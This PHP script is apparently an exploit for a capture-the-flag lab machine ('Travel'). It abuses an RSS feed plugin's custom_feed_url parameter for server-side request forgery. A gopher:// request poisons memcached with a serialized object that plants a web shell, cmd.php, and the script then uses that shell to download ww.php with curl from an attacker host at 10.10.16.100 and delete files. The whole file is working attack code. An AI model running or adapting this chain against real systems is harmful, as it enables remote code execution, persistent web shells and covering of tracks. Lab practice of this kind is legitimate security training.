<?php 

include('exfil/files/template.php');

$rce = file_get_contents("simple.php");
$template = new TemplateHelper('cmd.php', $rce);
$payload = serialize($template);
$encoded_payload = urlencode(serialize($template));
$url = "gopher://127.1:11211/_%0d%0aset%20xct_da5c741d4cfdc19f87627485e73f5957%204%2030%20".strlen($payload)."%0d%0a".$encoded_payload."%0d%0a";

$full_url = "http://blog.travel.htb/awesome-rss/?custom_feed_url=".$url;

exec("curl ".$full_url);
$rss_url = "http://10.10.16.100:8000/customfeed.xml";
echo file_get_contents("http://blog.travel.htb/wp-content/themes/twentytwenty/debug.php");
file_get_contents("http://blog.travel.htb/awesome-rss/?custom_feed_url=".$rss_url);

file_get_contents("http://blog.travel.htb/wp-content/themes/twentytwenty/logs/cmd.php?cmd=rm+ww.php");
$get_ww = urlencode("curl http://10.10.16.100:8000/ww.php -O ww.php");
$rm_cmd = urlencode("rm cmd.php");
echo file_get_contents("http://blog.travel.htb/wp-content/themes/twentytwenty/logs/cmd.php?cmd=".$get_ww);
sleep(5);
echo file_get_contents("http://blog.travel.htb/wp-content/themes/twentytwenty/logs/cmd.php?cmd=ls");
file_get_contents("http://blog.travel.htb/wp-content/themes/twentytwenty/logs/cmd.php?cmd=".$rm_cmd);

?>
